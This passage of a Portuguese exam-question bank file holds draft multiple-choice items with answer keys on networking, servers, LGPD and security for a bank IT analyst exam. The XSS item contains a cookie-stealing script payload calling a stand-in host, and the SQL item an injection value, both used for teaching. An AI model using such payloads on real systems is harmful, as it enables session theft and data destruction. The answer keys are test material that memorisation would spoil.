  "comentario": "**Gabarito: B.** No IIS, o **binding** combina protocolo, IP, porta e **nome de host**; com HTTPS, o **SNI** permite escolher o certificado de cada nome no mesmo IP e porta.\n\n(A) O pool isola processos, mas não define qual site atende cada nome. (C), (D) e (E) São conceitos do Apache HTTP Server, não do IIS.\n\nRevisar: Apostila 04, §25.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V013",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP",
  "ref_apostila": {
    "modulo": "04",
    "secao": "25",
    "titulo": "Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#25. Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §25 – Q4",
    "id_pai": "ESP-SERV-0013",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um WildFly executado no modo standalone tem sua configuração principal no arquivo ______, console de administração na porta padrão ______, e aplicações podem ser implantadas copiando o `.war` para a pasta ______. As lacunas são preenchidas, respectivamente, por",
  "imagem": null,
  "alternativas": {
    "A": "domain.xml; 8080; webapps",
    "B": "httpd.conf; 9990; htdocs",
    "C": "standalone.xml; 9990; deployments",
    "D": "web.config; 8443; wwwroot",
    "E": "host.xml; 8080; lib"
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** No modo **standalone**, a configuração fica em **standalone.xml**; o console de administração usa a porta **9990**; e o scanner automático implanta o que é copiado para **deployments** (também é possível usar o console ou a `jboss-cli`). As aplicações atendem por padrão na 8080.\n\n(A) domain.xml é do modo domain e webapps é do Tomcat. (B) httpd.conf e htdocs são do Apache. (D) web.config e wwwroot são do IIS. (E) host.xml é do modo domain.\n\nRevisar: Apostila 04, §25.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V014",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "SNMP, agentes, gerentes e MIBs",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.10",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No gerenciamento de redes com SNMP, a mensagem enviada espontaneamente pelo agente de um switch ao gerente, sem que tenha havido consulta, para comunicar, por exemplo, que uma interface caiu, é o",
  "imagem": null,
  "alternativas": {
    "A": "GET.",
    "B": "GETNEXT.",
    "C": "SET.",
    "D": "RESPONSE.",
    "E": "TRAP."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** O **TRAP** (e o INFORM, com confirmação, a partir da v2c) é a notificação **espontânea** do agente ao gerente, usando a porta UDP 162.\n\n(A) e (B) GET e GETNEXT são consultas do gerente (porta 161 do agente). (C) SET altera um valor no agente. (D) RESPONSE é a resposta do agente a uma consulta.\n\nRevisar: Apostila 04, §16.10.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V015",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "SNMP, agentes, gerentes e MIBs",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.10",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre o SNMP, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "as variáveis gerenciáveis de um dispositivo são descritas na MIB e identificadas por OIDs; as versões v1 e v2c usam community strings em texto claro, e a v3 acrescenta autenticação e criptografia.",
    "B": "o agente roda na estação de gerência e o gerente roda em cada equipamento monitorado.",
    "C": "o SNMP usa TCP 443 para garantir a confidencialidade desde a versão 1.",
    "D": "a community \"public\" é recomendada em produção, por ser a padrão de fábrica.",
    "E": "a MIB é o protocolo de transporte usado entre gerente e agente."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** A **MIB** descreve as variáveis, identificadas por **OIDs**; **v1/v2c** usam community strings em texto claro (inseguras), e o **SNMPv3** acrescenta autenticação e criptografia.\n\n(B) Inverte: o agente fica no dispositivo; o gerente, na estação de gerência. (C) O SNMP usa UDP 161/162; a v1 não tem criptografia. (D) A community \"public\" é um risco clássico e deve ser trocada ou abandonada em favor da v3. (E) A MIB é uma base de informações, não um protocolo.\n\nRevisar: Apostila 04, §16.10.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V016",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Métodos de avaliação de desempenho: RFC 2544 e RFC 2889",
  "ref_apostila": {
    "modulo": "04",
    "secao": "23",
    "titulo": "Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#23. Cabeamento estruturado, fibra óptica e testes de desempenho (NBR 14565, RFC 2544/2889)]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §23.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para homologar novos switches de acesso, uma equipe quer medir a taxa de encaminhamento, o comportamento sob congestionamento, a capacidade da tabela de endereços MAC, a taxa de aprendizado de endereços e o encaminhamento de broadcast. A metodologia de benchmark específica para esse tipo de dispositivo é a",
  "imagem": null,
  "alternativas": {
    "A": "RFC 2544, voltada apenas a links WAN.",
    "B": "RFC 2889, metodologia de benchmark para dispositivos de comutação de LAN.",
    "C": "ABNT NBR 14565:2019.",
    "D": "ITU-T G.114.",
    "E": "IEEE 802.3af."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** A **RFC 2889** é específica para **switches LAN**: taxa de encaminhamento, congestionamento, capacidade e aprendizado da tabela MAC, broadcast. A **RFC 2544** é a metodologia geral para dispositivos de interconexão (vazão, latência, perda de quadros, back-to-back).\n\n(A) A RFC 2544 não se limita a WAN, e o pedido é específico de switching. (C) A NBR 14565 trata de cabeamento estruturado. (D) G.114 trata de atraso em voz. (E) 802.3af é PoE.\n\nRevisar: Apostila 04, §23.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V017",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Serviços de rede: proxy, e-mail e DHCP",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.10",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na rede de um banco, o servidor A intermedeia o acesso dos funcionários à internet, aplicando filtros de conteúdo, autenticação e cache; o servidor B fica na frente dos servidores web do internet banking, recebendo as conexões dos clientes, terminando o TLS e distribuindo a carga. A e B são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "proxy reverso e proxy direto (forward).",
    "B": "servidor DHCP e servidor DNS.",
    "C": "proxy direto (forward) e proxy reverso.",
    "D": "IDS e IPS.",
    "E": "gateway VoIP e MCU."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **proxy direto (forward)** atende os **clientes internos** no acesso à internet (controle, filtragem, cache — ex.: Squid); o **proxy reverso** fica **na frente dos servidores** (balanceamento, terminação TLS, cache, WAF — ex.: Nginx, HAProxy).\n\n(A) Inverte os papéis. (B) DHCP e DNS não intermedeiam conexões HTTP. (D) IDS e IPS detectam/bloqueiam ataques. (E) São componentes de telefonia e videoconferência.\n\nRevisar: Apostila 04, §16.10.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V018",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Serviços de rede: proxy, e-mail e DHCP",
  "ref_apostila": {
    "modulo": "04",
    "secao": "11",
    "titulo": "Windows Server",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#11. Windows Server]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §11.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para reduzir a falsificação de e-mails com o domínio `banco.com.br` em campanhas de phishing, o administrador publicou no DNS registros que indicam quais servidores podem enviar mensagens pelo domínio, a chave pública usada para verificar a assinatura das mensagens e a política a aplicar quando essas verificações falham. Esses mecanismos, publicados em registros TXT, são",
  "imagem": null,
  "alternativas": {
    "A": "MX, PTR e SOA.",
    "B": "POP3, IMAP e SMTP.",
    "C": "SPF, DKIM e DMARC.",
    "D": "A, AAAA e CNAME.",
    "E": "LDAP, Kerberos e NTLM."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** **SPF** lista os servidores autorizados a enviar pelo domínio; **DKIM** publica a chave pública para verificar a assinatura das mensagens; **DMARC** define a política (nenhuma ação, quarentena, rejeição) e os relatórios. Todos usam registros **TXT**.\n\n(A) MX indica os servidores que recebem e-mail do domínio; PTR faz resolução reversa; SOA define a autoridade da zona. (B) São protocolos de acesso e envio de e-mail. (D) São registros de endereço e apelido. (E) São protocolos de diretório e autenticação.\n\nRevisar: Apostila 04, §11.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V019",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Serviços de rede: proxy, e-mail e DHCP",
  "ref_apostila": {
    "modulo": "04",
    "secao": "11",
    "titulo": "Windows Server",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#11. Windows Server]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §11.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "O servidor DHCP de uma empresa fica na VLAN de servidores (10.10.1.0/24). Os computadores da VLAN de uma nova agência (10.20.5.0/24) não recebem endereço e acabam com IPs 169.254.x.x. A causa provável e a solução são:",
  "imagem": null,
  "alternativas": {
    "A": "o escopo está cheio; deve-se criar exclusões.",
    "B": "o DNS está sem zona reversa; deve-se criar a zona in-addr.arpa.",
    "C": "falta uma reserva por MAC para cada computador.",
    "D": "o DHCP Discover é broadcast e não atravessa o roteador; deve-se configurar um agente de retransmissão (DHCP relay/ip helper) na interface da VLAN da agência, além de um escopo para 10.20.5.0/24.",
    "E": "o servidor DHCP deve ser movido para a mesma VLAN de cada agência, pois o protocolo não funciona entre sub-redes em nenhuma hipótese."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** O **Discover é broadcast**, e roteadores não encaminham broadcast; sem resposta, o Windows assume um endereço **APIPA** (169.254.0.0/16). Solução: **DHCP relay** (ip helper-address) na interface da VLAN da agência, que repassa em unicast ao servidor, e um escopo para a sub-rede.\n\n(A) Exclusões reduzem a faixa distribuída; não resolvem. (B) Zona reversa é do DNS. (C) Reservas não são necessárias para receber endereço. (E) Com relay o DHCP atende várias sub-redes.\n\nRevisar: Apostila 04, §11.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V020",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "VPNs corporativas e acesso remoto seguro",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.12",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na VPN de acesso remoto dos funcionários em teletrabalho, a equipe de segurança exige que todo o tráfego do notebook corporativo, inclusive a navegação na internet, passe pelo túnel e pelos controles da empresa. Em vez de usar split tunneling, deve-se configurar",
  "imagem": null,
  "alternativas": {
    "A": "uma VPN site a site IPsec entre a casa de cada funcionário e o banco.",
    "B": "o modo full tunnel no cliente VPN.",
    "C": "o protocolo PPTP, por ser mais leve.",
    "D": "o AH do IPsec, para cifrar o tráfego.",
    "E": "uma VPN MPLS da operadora em cada residência."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** No **full tunnel**, todo o tráfego passa pela VPN; no **split tunneling** só o tráfego corporativo usa o túnel e o resto vai direto à internet, reduzindo o controle de segurança.\n\n(A) Site a site liga redes inteiras por gateways; acesso remoto usa cliente VPN. (C) O PPTP é inseguro. (D) O AH não cifra. (E) VPN MPLS é separação lógica na rede da operadora, inviável por residência.\n\nRevisar: Apostila 04, §16.12.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V021",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Níveis de serviço e métricas de desempenho",
  "ref_apostila": {
    "modulo": "04",
    "secao": "22",
    "titulo": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#22. Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §22.1",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um serviço de autenticação apresentou, no último ano, tempo médio entre falhas (MTBF) de 495 horas e tempo médio de reparo (MTTR) de 5 horas. Usando a relação disponibilidade = MTBF ÷ (MTBF + MTTR), a disponibilidade do serviço é de",
  "imagem": null,
  "alternativas": {
    "A": "98,99%.",
    "B": "99,00%.",
    "C": "99,50%.",
    "D": "99,90%.",
    "E": "1,00%."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** Disponibilidade = 495 ÷ (495 + 5) = 495 ÷ 500 = 0,99 = **99,00%**.\n\n(A) 98,99% vem de 1 − 5 ÷ 495, fórmula incorreta. (C) e (D) Não decorrem dos dados. (E) 1% é a **indisponibilidade** (5 ÷ 500).\n\nConta conferida em `tools/verificacao/agente4/verif_serv.py`.\n\nRevisar: Apostila 04, §22.1.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V022",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Configuração, administração e logs de serviços",
  "ref_apostila": {
    "modulo": "04",
    "secao": "12",
    "titulo": "Linux",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#12. Linux]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um servidor Oracle Linux com systemd, o administrador quer acompanhar em tempo real as mensagens de log do serviço `httpd` e, separadamente, garantir que os arquivos de log em /var/log sejam rotacionados e compactados periodicamente. As ferramentas adequadas são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "`journalctl -u httpd -f` e logrotate.",
    "B": "`dmesg -c` e crontab -r.",
    "C": "`systemctl disable httpd` e rsync.",
    "D": "`tail /etc/passwd` e gzip -d.",
    "E": "`ss -tulpn` e logger."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** `journalctl -u httpd -f` mostra o journal do systemd filtrado pela unidade e o acompanha (*follow*); o **logrotate** faz a rotação e a compactação dos arquivos de log.\n\n(B) `dmesg -c` lê e limpa o buffer do kernel; `crontab -r` **apaga** o crontab. (C) `systemctl disable` desativa o serviço no boot; rsync copia arquivos. (D) /etc/passwd não é log, e `gzip -d` descompacta. (E) `ss -tulpn` lista portas em escuta; logger grava uma mensagem no syslog.\n\nRevisar: Apostila 04, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V001",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "LGPD: anonimização e pseudonimização",
  "ref_apostila": {
    "modulo": "04",
    "secao": "20",
    "titulo": "LGPD – Lei Geral de Proteção de Dados",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#20. LGPD – Lei Geral de Proteção de Dados]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Banestes 2021 (FGV) – Q60",
    "id_pai": "ESP-SEG-0001",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "A equipe de ciência de dados de um banco recebeu a tabela de transações com o CPF de cada cliente substituído por um token aleatório (por exemplo, `C-8F3A21`). A tabela que associa cada token ao CPF original fica guardada pela área de segurança, em ambiente controlado e separado. À luz da LGPD, esse tratamento é",
  "imagem": null,
  "alternativas": {
    "A": "anonimização, e os dados deixam de ser pessoais.",
    "B": "bloqueio, pois suspende temporariamente o tratamento.",
    "C": "eliminação, pois o CPF foi apagado da tabela.",
    "D": "pseudonimização, e os dados continuam sendo dados pessoais.",
    "E": "difusão, pois os dados foram compartilhados com outra área."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Na **pseudonimização** (art. 13, § 4º), o dado perde a associação ao titular **senão pelo uso de informação adicional mantida separadamente** (a tabela de-para). É reversível por quem tem essa informação, por isso **continua sendo dado pessoal**.\n\n(A) Anonimização é irreversível por meios razoáveis, e não há tabela de correspondência. (B) Bloqueio é a suspensão temporária de qualquer operação de tratamento. (C) Eliminação é a exclusão do dado, que aqui pode ser recuperado. (E) Difusão é a divulgação dos dados, não a técnica aplicada.\n\nRevisar: Apostila 04, §20.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V002",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "LGPD: anonimização e pseudonimização",
  "ref_apostila": {
    "modulo": "04",
    "secao": "20",
    "titulo": "LGPD – Lei Geral de Proteção de Dados",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#20. LGPD – Lei Geral de Proteção de Dados]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Banestes 2021 (FGV) – Q60",
    "id_pai": "ESP-SEG-0001",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Um banco precisa disponibilizar a uma universidade uma base para pesquisa sem dados pessoais. Entre as medidas propostas, a que NÃO garante a anonimização, por permitir a reidentificação com esforço razoável, é",
  "imagem": null,
  "alternativas": {
    "A": "suprimir as colunas de nome, CPF, endereço e telefone.",
    "B": "generalizar a idade em faixas (30–39) e o CEP para os três primeiros dígitos.",
    "C": "substituir o CPF pelo seu hash SHA-256 sem chave secreta, mantendo as demais colunas inalteradas.",
    "D": "agregar os dados em estatísticas por município e faixa etária.",
    "E": "garantir k-anonimato, de modo que cada registro seja indistinguível de pelo menos k − 1 outros."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O universo de CPFs é limitado: basta calcular o hash de todos os CPFs possíveis (ataque de dicionário) para reverter o SHA-256 sem chave. Além disso, as demais colunas mantidas permitem cruzamentos. Hash sem chave de CPF **não anonimiza**.\n\n(A) Supressão, (B) generalização, (D) agregação e (E) k-anonimato são técnicas de anonimização citadas na apostila.\n\nO script `tools/verificacao/agente4/verif_seg.py` demonstra a reversão do hash por força bruta em um subconjunto de CPFs.\n\nRevisar: Apostila 04, §20.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V003",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "SQL injection e consultas parametrizadas",
  "ref_apostila": {
    "modulo": "04",
    "secao": "19",
    "titulo": "OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#19. OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Banestes 2024 (ACCESS) – Q55",
    "id_pai": "ESP-SEG-0002",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Considere a tabela `conta`, com 5 linhas cujos ids (inteiros) vão de 10 a 14, e o código Python a seguir, em que `id_conta` vem de um campo de formulário preenchido com o texto `10 OR 1=1`:\n\n```python\n# versão 1\ncur.execute(\"DELETE FROM conta WHERE id = \" + id_conta)\n# versão 2\ncur.execute(\"DELETE FROM conta WHERE id = ?\", (id_conta,))\n```\n\nExecutando cada versão sobre a tabela original (SQLite), o número de linhas removidas é, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "1 e 1.",
    "B": "5 e 5.",
    "C": "5 e 0.",
    "D": "0 e 5.",
    "E": "1 e 0."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Na **versão 1**, a concatenação transforma o dado em código: o comando vira `DELETE FROM conta WHERE id = 10 OR 1=1`, e a condição é verdadeira para **todas as 5 linhas**. Na **versão 2**, o placeholder `?` envia o texto `10 OR 1=1` como **valor**; nenhum id é igual a esse texto, e **0** linhas são removidas.\n\n(A) e (E) Supõem que só a linha 10 seria atingida. (B) Supõe que o placeholder também seria vulnerável. (D) Inverte as versões.\n\nExecutado em SQLite em `tools/verificacao/agente4/verif_seg.py`.\n\nRevisar: Apostila 04, §19.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V004",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Ataques a aplicações web: XSS",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q21",
    "id_pai": "ESP-SEG-0003",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No campo \"apelido\" do cadastro de um aplicativo, um atacante gravou o texto `<script>fetch('https://x.example/?c='+document.cookie)</script>`. Sempre que um atendente abre a ficha desse cliente no painel interno, o script é executado no navegador do atendente. As medidas mais adequadas para eliminar essa vulnerabilidade são",
  "imagem": null,
  "alternativas": {
    "A": "usar consultas parametrizadas no banco de dados.",
    "B": "codificar a saída conforme o contexto (HTML-escape) ao exibir dados e adotar uma Content Security Policy, além de cookies HttpOnly.",
    "C": "aumentar o tamanho do campo apelido.",
    "D": "usar HTTPS em todo o painel.",
    "E": "aplicar backup diferencial diário da base de clientes."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** É **XSS armazenado**: o script fica gravado e roda no navegador de quem vê o dado. Defesas: **codificação de saída** conforme o contexto, validação de entrada, **CSP** e cookies **HttpOnly** (impedem que o script leia o cookie de sessão).\n\n(A) Consultas parametrizadas evitam SQL injection, não XSS. (C) Aumentar o campo não resolve. (D) HTTPS protege o transporte; o script chega cifrado do mesmo jeito. (E) Backup não previne o ataque.\n\nRevisar: Apostila 04, §17.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V005",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Assinatura digital",
  "ref_apostila": {
    "modulo": "04",
    "secao": "18",
    "titulo": "Criptografia, hash, assinatura digital e certificação digital (ICP-Brasil)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#18. Criptografia, hash, assinatura digital e certificação digital (ICP-Brasil)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q22",
    "id_pai": "ESP-SEG-0004",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Ana precisa enviar a Bruno um contrato de modo que (1) somente Bruno consiga lê-lo e (2) Bruno possa comprovar que foi Ana quem o enviou e que ele não foi alterado. Usando criptografia assimétrica, Ana deve",
  "imagem": null,
  "alternativas": {
    "A": "cifrar o contrato com a chave privada de Bruno e assinar o hash com a chave pública de Ana.",
    "B": "assinar o hash do contrato com a chave pública de Bruno e cifrar com a chave privada de Ana.",
    "C": "cifrar o contrato e o hash com a chave pública de Ana.",
    "D": "assinar o hash do contrato com a chave privada de Ana e cifrar o conjunto com a chave pública de Bruno.",
    "E": "enviar o contrato em claro com o hash SHA-256 anexado, o que garante os dois requisitos."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Autenticidade, integridade e não repúdio: **assinar** o hash com a **chave privada de Ana** (verificável com a pública dela). Sigilo: **cifrar** com a **chave pública de Bruno** (só a privada dele decifra). Na prática, cifra-se o conteúdo com uma chave simétrica e protege-se essa chave com a pública de Bruno.\n\n(A) Ana não tem a chave privada de Bruno. (B) Inverte o uso das chaves. (C) Cifrar com a pública de Ana só permitiria a ela mesma decifrar. (E) Hash sem assinatura não prova autoria (qualquer um recalcula) e não dá sigilo.\n\nRevisar: Apostila 04, §18.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
